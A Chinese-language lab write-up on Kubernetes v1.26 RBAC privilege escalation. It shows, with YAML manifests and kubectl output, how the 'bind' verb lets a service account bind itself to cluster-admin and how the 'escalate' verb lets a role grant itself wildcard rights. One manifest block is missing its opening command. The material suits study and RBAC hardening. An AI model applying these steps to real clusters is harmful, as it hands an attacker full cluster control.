
测试kubernetes版本：v1.26.0

##  利用`bind`进行权限提升

`bind`动词允许用户创建一个`rolebinding`或`clusterrolebinding`资源，即使当前主体没有目标资源对应的角色权限

从上文对`bind`动词的解释可以得出当前主体如果具备对`role`、`clusterrole`的bind能力，那么当前主体 (`be-test`)能够get、create对应的`rolebinding`、`clusterrolebinding`资源，当前主体的示例角色如下：

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: bind-test
rules:
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - clusterroles
  - roles
  verbs:
  - bind
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - clusterrolebindings
  - rolebindings
  verbs:
  - create
  - get
```

`kubectl auth can-i --list`

```text
Resources                                       Non-Resource URLs                     Resource Names   Verbs
clusterroles.rbac.authorization.k8s.io          []                                    []               [bind]
roles.rbac.authorization.k8s.io                 []                                    []               [bind]
clusterrolebindings.rbac.authorization.k8s.io   []                                    []               [create get]
rolebindings.rbac.authorization.k8s.io          []                                    []               [create get]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

利用这个主体创建`clusterrolebinding`将当前主体绑定到`cluster-admin`角色

```shell
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: bind-test-binding2
subjects:
- kind: ServiceAccount
  name: be-test
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

```

`kubectl auth can-i --list`，主体已经具备cluster-admin角色相关权限

```text
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
clusterroles.rbac.authorization.k8s.io          []                                    []               [bind]
roles.rbac.authorization.k8s.io                 []                                    []               [bind]
clusterrolebindings.rbac.authorization.k8s.io   []                                    []               [create get]
rolebindings.rbac.authorization.k8s.io          []                                    []               [create get]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
                                                
```

## 利用`escalate`进行权限提升

`escalate`动词允许用户为当前绑定的角色增加当前不具备的权限，当前主体的角色权限情况如下：

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: escalate-test
rules:
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - clusterroles
  - roles
  verbs:
  - escalate
  - get
  - patch
```

`kubectl auth can-i --list`

```text
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
clusterroles.rbac.authorization.k8s.io          []                                    []               [escalate get patch]
roles.rbac.authorization.k8s.io                 []                                    []               [escalate get patch]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

执行 `kubectl edit clusterroles escalate-test` 

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: escalate-test
rules:
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - clusterroles
  - roles
  verbs:
  - escalate
  - get
  - patch
# edit add
- apiGroups:
  - '*'
  resources:
  - '*'
  verbs:
  - '*'
- nonResourceURLs:
  - '*'
  verbs:
  - '*'
```

`kubectl auth can-i --list`

```text
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
clusterroles.rbac.authorization.k8s.io          []                                    []               [escalate get patch]
roles.rbac.authorization.k8s.io                 []                                    []               [escalate get patch]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```